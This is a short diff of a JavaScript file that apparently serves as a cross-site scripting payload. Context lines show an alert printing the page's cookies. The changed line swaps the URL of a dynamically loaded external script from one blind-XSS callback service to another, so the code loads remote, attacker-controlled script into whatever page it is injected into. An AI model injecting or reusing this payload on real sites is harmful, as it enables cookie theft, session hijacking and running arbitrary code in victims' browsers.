@@ -68,5 +68,5 @@ alert("Here are your cookies: " + document.cookie);
 
 // Dynamically load an external script
 var script = document.createElement('script');
-script.src = "https://abhishek.bxss.in";
+script.src = "https://xss.report/c/abhishekdirisipo";
 document.head.appendChild(script);
